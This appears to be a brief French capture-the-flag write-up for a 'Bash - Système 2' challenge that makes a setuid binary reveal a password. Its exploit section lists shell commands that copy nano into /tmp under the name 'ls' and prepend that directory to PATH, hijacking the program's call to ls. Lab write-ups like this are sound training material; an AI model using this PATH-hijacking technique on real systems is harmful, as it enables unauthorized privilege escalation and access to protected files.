# Challenge Bash - Système 2

## Todo :

Exécuter le code compilé pour afficher le mot de passe 


### Note :

  - alias et export ne fonctionnent pas dans ce cas
  - commande utilise des arguments 

## Exploit :

mkdir -pv /tmp/exploit

cp -avr $(which nano) /tmp/exploit/ls

export PATH=/tmp/exploit:$PATH

./ch12
